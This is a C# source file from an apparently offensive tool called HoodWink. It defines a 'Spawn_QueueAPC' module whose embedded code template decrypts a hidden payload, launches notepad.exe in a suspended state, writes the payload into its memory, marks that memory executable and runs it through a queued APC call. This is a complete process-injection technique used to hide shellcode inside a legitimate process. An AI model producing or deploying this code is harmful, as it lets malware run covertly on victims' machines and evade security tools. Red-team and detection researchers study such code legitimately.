using HoodWink.Models;

namespace HoodWink.Modules
{
    public class Spawn_QueueAPC : Models.Module
    {
        public override string Name => "Spawn_QueueAPC";

        public override string Description => "Execute in Spawned process via QueueAPC";

        public override Types Type => Types.Spawn;

        public override string Header => Models.Defaults.Header;

        public override string Footer => Models.Defaults.Footer;

        public override string Core => @"
         byte[] payload = Decrypt(b64, key, iv);

         var pa = new HoodWink.Utils.Kernel32.SECURITY_ATTRIBUTES();
         pa.nLength = Marshal.SizeOf(pa);

         var ta = new HoodWink.Utils.Kernel32.SECURITY_ATTRIBUTES();
         ta.nLength = Marshal.SizeOf(ta);

         var si = new HoodWink.Utils.Kernel32.STARTUPINFO();

         if (!HoodWink.Utils.Kernel32.CreateProcess(@""C:\Windows\System32\notepad.exe"", null,
             ref pa, ref ta,
             false,
             HoodWink.Utils.Kernel32.CreationFlags.CreateSuspended,
             IntPtr.Zero, @""C:\Windows\System32"", ref si, out var pi))
         {
            return;
         }

         var baseAddress = HoodWink.Utils.Kernel32.VirtualAllocEx(
             pi.hProcess,
             IntPtr.Zero,
             payload.Length,
             HoodWink.Utils.Kernel32.AllocationType.Commit | HoodWink.Utils.Kernel32.AllocationType.Reserve,
             HoodWink.Utils.Kernel32.MemoryProtection.ReadWrite);

         HoodWink.Utils.Kernel32.WriteProcessMemory(
             pi.hProcess,
             baseAddress,
             payload,
             payload.Length,
             out _);

         HoodWink.Utils.Kernel32.VirtualProtectEx(
             pi.hProcess,
             baseAddress,
             payload.Length,
             HoodWink.Utils.Kernel32.MemoryProtection.ExecuteRead,
             out _);

         HoodWink.Utils.Kernel32.QueueUserAPC(baseAddress, pi.hThread, 0);

         _ = HoodWink.Utils.Kernel32.ResumeThread(pi.hThread);
      }";
    }
}
